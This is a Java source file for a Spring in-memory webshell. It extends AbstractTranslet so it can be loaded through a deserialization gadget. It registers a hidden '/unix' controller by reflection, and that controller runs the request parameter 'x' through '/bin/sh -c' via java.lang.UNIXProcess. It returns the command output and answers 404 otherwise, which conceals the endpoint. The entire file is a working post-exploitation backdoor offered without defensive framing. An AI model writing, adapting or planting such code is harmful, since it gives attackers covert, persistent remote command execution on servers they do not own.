import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;
import org.springframework.web.servlet.handler.AbstractHandlerMethodMapping;
import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;
import org.springframework.web.util.pattern.PathPatternParser;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Map;

@RestController
public class MemController12 extends AbstractTranslet {
    public MemController12() throws Exception {
        final String controllerPath = "/unix";
        WebApplicationContext context = (WebApplicationContext)RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
        RequestMappingHandlerMapping r = context.getBean(RequestMappingHandlerMapping.class);
        Method method = MemController12.class.getDeclaredMethod("execX");
        Field mapfield = AbstractHandlerMethodMapping.class.getDeclaredField("mappingRegistry");
        mapfield.setAccessible(true);
        Object mr = mapfield.get(r);
        Class<?> mrclazz = Class.forName("org.springframework.web.servlet.handler.AbstractHandlerMethodMapping$MappingRegistry");
        Method mrms = mrclazz.getDeclaredMethod("register", Object.class, Object.class, Method.class);
        Field lookupfield = null;
        try {
            lookupfield = mrclazz.getDeclaredField("urlLookup");
            lookupfield.setAccessible(true);
        }catch (NoSuchFieldException e){
            lookupfield = mrclazz.getDeclaredField("pathLookup");
            lookupfield.setAccessible(true);
        }
        Map<String, Object> urlLookup = (Map<String, Object>) lookupfield.get(mr);
        for (String urlPath : urlLookup.keySet()) {
            if (controllerPath.equals(urlPath)) {
                throw new Exception("controller url path exist already");
            }
        }
        RequestMappingInfo.BuilderConfiguration option = new RequestMappingInfo.BuilderConfiguration();
        option.setPatternParser(new PathPatternParser());
        RequestMappingInfo info = RequestMappingInfo.paths(controllerPath).options(option).build();
        mrms.setAccessible(true);
        // 免进入实例创建的死循环
        MemController11 mem = new MemController11("aaa");
        mrms.invoke(mr, info, mem, method);
    }

    public MemController12(String aaa){}

    public void execX()  {
        HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();
        HttpServletResponse response = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse();
        try {
            Class<?> cls = Class.forName("java.lang.UNIXProcess");

            Constructor<?> constructor = cls.getDeclaredConstructors()[0];
            constructor.setAccessible(true);

            String arg0 = request.getParameter("x");
            PrintWriter writer = response.getWriter();
            if (arg0 != null) {

                String[] command = {"/bin/sh", "-c", arg0};

                byte[] prog = toCString(command[0]);
                byte[] argBlock = getArgBlock(command);
                int argc = argBlock.length;
                int[] fds = {-1, -1, -1};

                Object obj = constructor.newInstance(prog, argBlock, argc, null, 0, null, fds, false);

                Method method = cls.getDeclaredMethod("getInputStream");
                method.setAccessible(true);

                InputStream is = (InputStream) method.invoke(obj);
                InputStreamReader isr = new InputStreamReader(is);
                BufferedReader br = new BufferedReader(isr);
                StringBuilder stringBuilder = new StringBuilder();
                String line;
                while ((line = br.readLine()) != null) {
                    stringBuilder.append(line + '\n');
                }
                writer.println(stringBuilder);
            }else {
                response.sendError(404);
            }
            } catch (Exception e) {
        }
    }
    byte[] toCString(String s) {
        if (s == null)
            return null;
        byte[] bytes  = s.getBytes();
        byte[] result = new byte[bytes.length + 1];
        System.arraycopy(bytes, 0,
                result, 0,
                bytes.length);
        result[result.length - 1] = (byte) 0;
        return result;
    }

    byte[] getArgBlock(String[] strs) throws Exception{
        assert strs != null && strs.length > 0;

        // Convert arguments to a contiguous block; it's easier to do
        // memory management in Java than in C.
        byte[][] args = new byte[strs.length - 1][];

        int size = args.length; // For added NUL bytes
        for (int i = 0; i < args.length; i++) {
            args[i] = strs[i + 1].getBytes();
            size += args[i].length;
        }

        byte[] argBlock = new byte[size];
        int    i        = 0;

        for (byte[] arg : args) {
            System.arraycopy(arg, 0, argBlock, i, arg.length);
            i += arg.length + 1;
            // No need to write NUL bytes explicitly
        }

        int[] envc    = new int[1];
        int[] std_fds = new int[]{-1, -1, -1};

        FileInputStream f0 = null;
        FileOutputStream f1 = null;
        FileOutputStream f2 = null;

        // In theory, close() can throw IOException
        // (although it is rather unlikely to happen here)
        try {
            if (f0 != null) f0.close();
        } finally {
            try {
                if (f1 != null) f1.close();
            } finally {
                if (f2 != null) f2.close();
            }
        }
        return argBlock;
    }
    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
    }

}
